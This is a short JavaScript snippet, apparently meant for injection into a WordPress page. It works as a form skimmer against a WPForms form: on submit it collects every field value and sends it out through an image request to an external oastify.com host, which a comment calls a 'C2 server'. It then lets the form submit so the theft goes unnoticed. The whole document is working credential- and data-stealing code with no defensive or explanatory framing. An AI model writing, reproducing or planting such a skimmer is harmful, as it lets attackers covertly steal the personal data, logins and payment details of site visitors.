<script>
(function() {
    // Function to send form data
    function sendFormData(event) {
        var formData = {};
        var form = document.getElementById('wpforms-form-6402');

        if (form) {
            form.querySelectorAll('input, select, textarea').forEach(function(input) {
                formData[input.name] = input.value;
            });

            // Convert formData object to query string
            var queryString = Object.keys(formData).map(function(key) {
                return encodeURIComponent(key) + '=' + encodeURIComponent(formData[key]);
            }).join('&');

            // Use an image to send the data
            var img = new Image();
            img.src = 'http://3quhoczday3fuhyi0xgphp3xnotfh75w.oastify.com?' + queryString; // Replace with your C2 server URL
        }

        // Allow the form to submit
        if (event) {
            event.preventDefault();
            form.submit();
        }
    }

    // Attach event listener to the form on every page load
    function attachEventListener() {
        var form = document.getElementById('wpforms-form-6402');
        if (form) {
            form.addEventListener('submit', sendFormData);
        }
    }

    // Ensure the script runs when the page loads
    window.addEventListener('load', attachEventListener);

    // Execute immediately to capture any pre-filled data
    attachEventListener();
})();
</script>
